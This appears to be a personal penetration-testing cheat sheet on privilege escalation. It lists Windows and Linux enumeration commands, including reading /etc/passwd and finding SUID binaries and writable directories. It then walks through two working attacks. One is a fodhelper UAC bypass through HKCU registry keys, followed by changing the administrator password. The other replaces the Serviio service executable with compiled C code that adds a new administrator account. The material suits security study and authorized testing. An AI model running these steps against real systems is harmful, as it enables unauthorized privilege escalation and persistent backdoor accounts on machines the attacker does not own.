ENUMERATING USERS:<

ALWAYS RUN whoami FIRST, IF ON WINDOWS RUN net user <RESPONSE FROM WHOAMI> AS WELL AS JUST NET USER, IF ON LINUX RUN id
AS WELL AS CAT /ETC/PASSWD
RUN HOSTNAME ON BOTH

ENUMERATING OS:<

RUN SYSTEMINFO ON WINDOWS, ON LINUX RUN CAT /ETC/ISSUE AND CAT /ETC/*-RELEASE

ENUMERATING PROCESSES:<

ON WINDOWS RUN tasklist /SVC FOR LISTING RUNNING PROCESSES MAPPED TO A SPECIFIC WINDOWS SERVICE, ON LINUX RUN ps axu

ENUMERATING NETWORKING INFO:<

ON WINDOWS RUN ipconfig /all FOR NETWORK INFO, AS WELL AS route print
ON WINDOWS netstat -ano FOR ACTIVE TCP CONNECTIONS OR -no, ON LINUX IF ifconfig DOESNT WORK TRY ip a, AND /sbin/route OR routel
FOR ROUTES, AND FOR ACTIVE CONNECTIONS netstat OR ss WHICH TAKE THE OPTIONS -a TO LIST ALL -n TO AVOID HOSTNAME RES, AND -p TO LIST THE OWNING PROCESS

FOR FIREWALL RULES ON WINDOWS CHECK netsh advfirewall show currentprofile, AND netsh advfirewall firewall show rule name=all
FOR LINUX TRY TO CAT /etc/iptables OR GREP FOR ANY iptables RELATED CONFIGS OR COMMANDS I.E. RESTORE

ENUMERATING SCHEDULED TASKS:<

FOR SCHEDULED TASKS ON WINDOWS TRY 
schtasks /query /fo LIST /v
FOR LINUX TRY
ls -lah /etc/cron* AND TRY TO CAT /etc/crontab

TO ENUMERATE PATCH LEVELS:<

ON WINDOWS TRY
wmic product get name, version, vendor
AND
wmic qfe get Caption, Description, HotFixID, InstalledOn

ON DEBIAN TO LIST PACKAGES USE
dpkg -l

ENUMERATING READABLE AND WRITABLE DIRECTORIES:<

ON WINDOWS TRY
accesschk.exe -uws "Everyone" "C:\Program Files"
AND
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match 'Everyone\sAllow\s\sModify"}
ON LINUX TRY
find / -writable -type d 2>/dev/null

ENUMERATING MOUNTED DISKS:<

ON WINDOWS TRY
mountvol
ON LINUX TRY
cat /etc/fstab
AND
mount
AS WELL AS 
/bin/lsblk

ENUMERATING DRIVERS:<

ON WINDOWS, IN POWERSHELL TRY
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
OR
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*searchterm*"}

ON LINUX TRY
lsmod
OR
/sbin/modinfo libata

ENUMERATING BINARIES THAT AUTOELEVATE:<
WINDOWS
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
AND
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

ON LINUX
find / -perm -u=s -type f 2>/dev/null

AUTOMATED ENUMERATION:<<<<<

CHECK PENTEST MONKEY GITHUB FOR WINDOWS PRIVE ESC CHECK
LOOK AT -h 
SAME FOR UNIX PRIVESC CHECK

IN WINDOWS YOU CAN ACCESS A HIGH INTEGRITY CMD BY RUNNING
powershell.exe Start-Process cmd.exe -Verb runAs

UAC BYPASS:<<

CREATIVITY IS KEY

WIN 10 1709 FODHELPER EXAMPLE
RUNS SIGCHECK IN THE SYSINTERNALS SUITE AGAINST FODHELPER
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
NOTICE REQUESTED EXEC LEVEL IS REQ ADMIN AND AUTOELEVATE IS SET TO TRUE

NOW START PROCMON.EXE AND THEN RESTART FODHELPER AND INSPECT IT BY FILTERING FOR FODHELPER 
THEN FILTER WITH OPERATION CONTAINS REG
THEN FILTER FOR RESULT IS NAME NOT FOUND
LOOK FOR HKCU REGISTERS THAT FIT THIS CRITERIA

NOTICE IT TRIES \Software\Classes\ms-settings\Shell\Open\command AND THAT THIS REGISTRY DOESNT EXIST, BUT SINCE WE ARE
HKCU WE CAN CREATE IT
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
AFTER RERUNNING WE SEE THAT IT ATTEMPTS TO QUERY (DelegateExecute) FROM THE NEW KEY, 
SO NOW WE'LL ADD AN EMPTY DELEGATEEXECUTE
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
IN HOPES THAT AS MSDN SPECIFIES IT'LL ATTEMPT TO ACCESS A PROGRAM AT
Shell\Open\command\Default

AND IT DOES... SO WE NEED TO ADD SOMETHING AS A DEFAULT TO LAUNCH WITH HIGH PRIVS...
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f

AND WE RERUN FODHELPER
NOW whoami /groups STATES WE ARE A HIGH INTEGRITY COMMAND PROMPT.... SO...
net user admin pass
AND WE CAN CHANGE THE ADMINISTRATOR PASSWORD WITHOUT UAC INTERVENTION

SERVIIO INSECURE PERMISSIONS EXAMPLE:<<<

RUN 
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
AND NOTICE SERVIIO IS LOCATED IN PROGRAM FILES AS OPPOSED TO /WINDOWS
ENUMERATE THE PERMISSIONS WITH
icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
AND YOU CAN SEE THAT BUILT IN USERS HAVE FULL READ AND WRITE ACCESS TO THE EXECUTABLE
SO IF WE WRITE SOMETHING LIKE

#include <stdlib.h>

int main()
{
  int i;
  
  i = system ("net user new newpass /add");
  i = system ("net localgroup administrators new /add");
  return 0;
}

AND CROSS COMPILE WITH 
i686-w64-mingw32-gcc adduser.c -o adduser.exe
WE CAN THEN FILE TRANSFER IT TO THE TARGET AND RUN
move "C:\PATH\TO\SERVIIO" "C:\PATH\TO\SERVIIO-ORIG"
AND
move adduser.exe "C:\PATH\TO\SERVIIO.EXE"

AND EVEN IF WE CANT RESTART THE SERVICE TO RUN OUR ADD USER SCRIPT, WE CAN CHECK IF IT IS AUTO WITH
wmic service where caption="Serviio" get name, caption, state, startmode
AND IF IT IS, JUST REBOOT THE MACHINE TO SEE OUR NEW USER AS A MEMBER OF THE ADMIN GROUP WITH 
shutdown /r /t 0



